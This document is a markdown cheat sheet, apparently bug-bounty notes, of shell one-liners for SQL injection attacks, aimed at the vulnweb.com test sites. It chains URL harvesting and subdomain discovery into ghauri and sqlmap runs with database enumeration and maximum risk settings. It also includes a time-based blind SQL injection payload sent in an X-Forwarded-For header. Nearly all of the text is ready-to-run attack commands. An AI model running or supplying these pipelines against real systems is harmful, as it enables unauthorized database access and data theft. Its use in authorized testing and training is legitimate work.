# SQLis

### waymore, qsreplace, gf, ghauri

```
waymore -i "testphp.vulnweb.com" -n -mode U | qsreplace -a "FUZZ" | grep "FUZZ" | sed 's/FUZZ//g' | gf sqli | sort -u | while read urls; do ghauri -u "$urls" --dbs --threads 2 --batch --level 2 | tee -a ghauri.sqli.txt; done
```

### waybackurls, gf, sqlmap

```
waybackurls | sort -u | gf sqli >> sqli; sqlmap -m sqli --batch --random-agent --level 3 --risk 3
```

### waybackurls, gf, sqlmap

```
waybackurls -no-subs "vulnweb.com" > wayback_urls_for_target.txt; python3 sqlidetector.py -f  wayback_urls_for_target.txt
```

### subfinder, httpx, waybackurls, gf, ghauri

```
subfinder -d vulnweb.com -recursive -all -silent | httpx | waybackurls | sort -u | gf sqli | sort -u | while read urls; do ghauri -u "$urls" --dbs --threads 2 --batch --level 2 | tee -a ghauri.sqli.txt; done
```



# Header based SQLis

```
subfinder -d vulnweb.com -recursive -all -silent | httpx -silent -H "X-Forwarded-For: 'XOR(if(now()=sysdate(),sleep(13),0))OR" -rt -timeout 20 -mrt '>13' | tee -a header_based_bsqli.txt
```




# Resources

https://github.com/Gerxnox/One-Liner-Collections

https://github.com/0xPugal/One-Liners

https://github.com/daffainfo/Oneliner-Bugbounty

https://github.com/thecybertix/One-Liner-Collections

https://github.com/dwisiswant0/awesome-oneliner-bugbounty
